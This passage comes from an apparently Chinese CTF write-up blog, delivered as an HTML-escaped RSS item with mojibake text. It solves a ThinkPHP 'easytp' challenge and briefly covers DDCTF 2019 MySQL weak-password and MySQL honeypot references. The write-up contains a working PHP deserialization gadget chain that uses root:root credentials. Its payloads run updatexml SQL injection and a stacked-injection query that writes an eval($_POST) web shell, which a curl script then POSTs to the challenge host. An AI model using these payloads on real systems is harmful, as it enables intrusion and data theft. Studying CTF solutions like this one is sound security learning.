&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;cURL Error #:&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$err&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$response&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219200242251.png" alt="image-20211219200242251">&lt;/p>
&lt;p>çœ‹åˆ°äº†mysqlç”¨æˆ·ï¼Œå°è¯•å¼±å£ä»¤å¾—åˆ°root: root&lt;/p>
&lt;p>ä¹‹åå°±å¯ä»¥æŠŠæˆ‘ä»¬çš„ä¼ªæœåŠ¡ç«¯æ’¤äº†ï¼Œæ¢æˆçœŸæœåŠ¡ç«¯çš„ï¼Œè¿›è¡Œä¸€ä¸ªæ³¨å…¥&lt;/p>
&lt;ul>
&lt;li>ä½¿ç”¨ç›®æ ‡çš„æ•°æ®åº“é…ç½®å†æ¬¡è¿›è¡Œååºåˆ—åŒ–&lt;/li>
&lt;li>è§¦å‘&lt;code>DELETE&lt;/code>è¯­å¥çš„SQLæ³¨å…¥&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">pk&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#75715e">// &amp;#34;table&amp;#34; =&amp;gt; &amp;#34;mysql.user where 1=updatexml(1,concat(0x7e,(select left(group_concat(schema_name),31) from information_schema.SCHEMATA)),1)#&amp;#34;,
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// &amp;#34;table&amp;#34; =&amp;gt; &amp;#34;mysql.user where 1=updatexml(1,concat(0x7e,(select right(group_concat(schema_name),31) from information_schema.SCHEMATA)),1)#&amp;#34;,
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// &amp;#34;table&amp;#34; =&amp;gt; &amp;#34;mysql.user where 1=updatexml(1,concat(0x7e,(select left(group_concat(table_name),31) from information_schema.tables where table_schema=&amp;#39;test&amp;#39;),0x7e),1)#&amp;#34;,
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// &amp;#34;table&amp;#34; =&amp;gt; &amp;#34;mysql.user where 1=updatexml(1,concat(0x7e,(select left(group_concat(column_name),31) from information_schema.columns where table_schema=&amp;#39;test&amp;#39;),0x7e),1)#&amp;#34;,
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#d88200">&amp;#34;table&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;mysql.user where 1=updatexml(1,concat(0x7e,(select right(group_concat(flag),31) from test.flag),0x7e),1)#&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;where&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;1=1&amp;#34;&lt;/span>
&lt;span style="color:#111">);&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æˆ‘ä»¬è¿˜å¯ä»¥æŠŠå †å æ‰“å¼€ï¼Œç”¨å †å æ³¨å…¥å†™shellï¼Œä¹Ÿå°±æ˜¯æœ¬é¢˜çš„expï¼ˆå‚è€ƒ&lt;a href="https://www.zhaoj.in/read-6859.html#WEB3_easytp">èµµæ€»çš„exp&lt;/a> èµµæ€»ç‰›é€¼&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-php" data-lang="php">&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think\Db\Driver&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">PDO&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Mysql&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$options&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#75af00">PDO&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#75af00">MYSQL_ATTR_LOCAL_INFILE&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span> &lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75715e">// å¼€å¯æ‰èƒ½è¯»å–æ–‡ä»¶
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">PDO&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#75af00">MYSQL_ATTR_MULTI_STATEMENTS&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75715e">// æ‰“å¼€å †å æ³¨å…¥
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$config&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#34;debug&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;database&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;hostname&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;127.0.0.1&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;hostport&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;3306&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;charset&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;utf8&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;username&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;root&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75715e">// çŒœå‡ºå¼±å£ä»¤
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#d88200">&amp;#34;password&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;root&amp;#34;&lt;/span>
&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think\Image\Driver&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">Think\Session\Driver\Memcache&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Imagick&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$img&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">img&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Memcache&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think\Session\Driver&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">Think\Model&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Memcache&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$handle&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">handle&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Model&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">Think\Db\Driver\Mysql&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Model&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$options&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$pk&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$data&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$db&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">db&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Mysql&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">options&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;where&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">pk&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;id&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">data&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">pk&lt;/span>&lt;span style="color:#111">]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span> &lt;span style="color:#75715e">// å †å æ³¨å…¥å†™å…¥shell
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#d88200">&amp;#34;table&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;mysql.user where 1=1;select &amp;#39;&amp;lt;?php eval(&lt;/span>&lt;span style="color:#8045ff">\$&lt;/span>&lt;span style="color:#d88200">_POST[amiz]);?&amp;gt;&amp;#39; into outfile &amp;#39;/var/www/html/amiz.php&amp;#39;;#&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#d88200">&amp;#34;where&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;1=1&amp;#34;&lt;/span>
&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#75af00">base64_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Think\Image\Driver\Imagick&lt;/span>&lt;span style="color:#111">()));&lt;/span>
&lt;span style="color:#111">$curl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_init&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;span style="color:#75af00">curl_setopt_array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#75af00">CURLOPT_URL&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://914146f1-7d08-4a0a-9659-c143df1d68e1.node4.buuoj.cn:81/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_RETURNTRANSFER&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_ENCODING&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_MAXREDIRS&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">10&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_TIMEOUT&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_HTTP_VERSION&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">CURL_HTTP_VERSION_1_1&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_CUSTOMREQUEST&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;POST&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;span style="color:#75af00">CURLOPT_POSTFIELDS&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#75af00">base64_encode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">serialize&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Think\Image\Driver\Imagick&lt;/span>&lt;span style="color:#111">())),&lt;/span>
&lt;span style="color:#75af00">CURLOPT_HTTPHEADER&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;span style="color:#d88200">&amp;#34;cache-control: no-cache&amp;#34;&lt;/span>
&lt;span style="color:#111">),&lt;/span>
&lt;span style="color:#111">));&lt;/span>
&lt;span style="color:#111">$response&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_exec&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$err&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_error&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#75af00">curl_close&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$curl&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$err&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;cURL Error #:&amp;#34;&lt;/span> &lt;span style="color:#f92672">.&lt;/span> &lt;span style="color:#111">$err&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$response&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>å…¶ä¸­curlçš„ä»£ç æ˜¯ç”¨postmanç”Ÿæˆçš„ &lt;del>ï¼ˆpostmanæ‰“é’±ï¼‰&lt;/del> ä¸€å¥—è¿æ‹›ç›´æ¥å¸¦èµ°ï¼Œç”¨èšå‰‘è¿æ¥ä¹‹åå‘ç°æ ¹ç›®å½•ä¸‹æ²¡æœ‰flagï¼Œåè€Œæ˜¯ä¸€ä¸ªflag.sh&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219194548981.png" alt="image-20211219194548981">&lt;/p>
&lt;p>æˆ‘ä»¬è¿˜å¾—è¿ä¸Šæ•°æ®åº“çœ‹çœ‹&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219195443288.png" alt="image-20211219195443288">&lt;/p>
&lt;p>ä½†æ˜¯èšå‰‘è‡ªå¸¦çš„æ·»åŠ å¤±è´¥ï¼Œç›´æ¥æ‰‹åŠ¨å†™ä¸€ä¸ªå†°èçš„ğŸ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219195808735.png" alt="image-20211219195808735">&lt;/p>
&lt;p>ç›´æ¥æŸ¥çœ‹ä¹Ÿæ˜¯æ²¡æœ‰ï¼Œä½†æ˜¯å¯ä»¥ç”¨å®ƒçš„å¯¼å‡ºæ•°æ®åº“çš„åŠŸèƒ½å¾—åˆ°æ•°æ®&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://www.zhaoj.in/read-6859.html#WEB3_easytp">wp1&lt;/a> | &lt;a href="http://www.yang99.top/index.php/archives/48/#easytp">wp2&lt;/a>&lt;/p>
&lt;h2 id="ddctf-2019mysqlå¼±å£ä»¤">[DDCTF 2019]MySQLå¼±å£ä»¤&lt;/h2>
&lt;p>æ²¡æ‰¾åˆ°ç¯å¢ƒï¼Œçœ‹wpäº‘ä¸€ä¸‹&lt;/p>
&lt;p>éƒ¨ç½²å¥½agent.pyä¹‹åç”¨bettercapï¼Œè¯»/root/.mysql_historyæ‹¿flagä¸€æ³¢å¸¦èµ°&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://yelo.cc/2019/04/18/ddctf-2019-writeups-web-7.html">wp&lt;/a>&lt;/p>
&lt;h2 id="ä¸€ä¸ªä¸­ç­‰å¥½çš„èœœç½">ä¸€ä¸ªä¸­ç­‰å¥½çš„èœœç½&lt;/h2>
&lt;p>ä¹‹æ‰€ä»¥è¯´ä¸­ç­‰å¥½ï¼Œæ˜¯å› ä¸ºå®ƒå—åˆ¶äºå¯¹åº”æ•°æ®åº“çš„ç‰ˆæœ¬å’Œé…ç½®æƒ…å†µï¼Œæ‰€ä»¥å¹¶ä¸å¤Ÿé€šç”¨ï¼Œå¯ä»¥å‚è€ƒä»¥ä¸‹ä¸¤ä¸ªæ —å­ï¼š&lt;/p>
&lt;p>å‚è€ƒï¼š&lt;a href="https://mp.weixin.qq.com/s/m4I_YDn98K_A2yGAhv67Gg">MySQLèœœç½è·å–æ”»å‡»è€…å¾®ä¿¡ID&lt;/a> | &lt;a href="https://mp.weixin.qq.com/s/rQ9BpavBeMnS6xUOidZ5OA">æº¯æºååˆ¶ä¹‹MySQLèœœç½ç ”ç©¶&lt;/a>&lt;/p>
&lt;hr>
&lt;p>å””ï¼Œæ˜¯7æœˆåšé¢˜çš„æ—¶å€™ç¢°åˆ°çš„ç‚¹ï¼Œä»Šå¤©åšé¢˜åˆç¢°åˆ°äº†ï¼Œäºæ˜¯æ‹¿å‡ºæ¥é­ä¸ªå°¸ï¼Œæ¯”ä¹‹å‰çš„ç†è§£è¦æ·±åˆ»ä¸€äº›äº†&lt;/p>
&lt;p>æœ€è¿‘åœ¨çœ‹jsåŸå‹æ±¡æŸ“çš„ç›¸å…³é—®é¢˜ï¼Œç»“æœè€ƒäº†ä¸ªå››çº§ä¹‹åä¹‹å‰å†™çš„ä»£ç éƒ½ä¸è®¤å¾—äº†ğŸ˜…å°ä¸‘ç«Ÿæ˜¯æˆ‘è‡ªå·±&lt;/p>
&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
ä»¥ä¸‹æ˜¯æœ¬æ–‡ä¸­æ¶‰åŠåˆ°çš„ å’Œæˆ‘å­¦ä¹ æ—¶çœ‹è¿‡çš„æ‰€æœ‰æ–‡ç« çš„é“¾æ¥ğŸ”— æ¯æ—¥æ„Ÿè°¢äº’è”ç½‘çš„ä¸°å¯Œèµ„æºï¼ˆ
&lt;/h4>
&lt;/summary>
&lt;ul>
&lt;li>&lt;a href="http://russiansecurity.expert/2016/04/20/mysql-connect-file-read/">MySQL connect file read&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://lightless.me/archives/read-mysql-client-file.html">Read MySQL Client&amp;rsquo;s File&lt;/a> | &lt;a href="https://xz.aliyun.com/t/3277">ä»MySQLå‡ºå‘çš„åå‡»ä¹‹è·¯&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://www.anquanke.com/post/id/106488">å¦‚ä½•åˆ©ç”¨MySQL LOCAL INFILEè¯»å–å®¢æˆ·ç«¯æ–‡ä»¶&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://mp.weixin.qq.com/s/m4I_YDn98K_A2yGAhv67Gg">MySQLèœœç½è·å–æ”»å‡»è€…å¾®ä¿¡ID&lt;/a> | &lt;a href="https://mp.weixin.qq.com/s/rQ9BpavBeMnS6xUOidZ5OA">æº¯æºååˆ¶ä¹‹MySQLèœœç½ç ”ç©¶&lt;/a>&lt;/li>
&lt;/ul>
&lt;/details></description></item></channel></rss>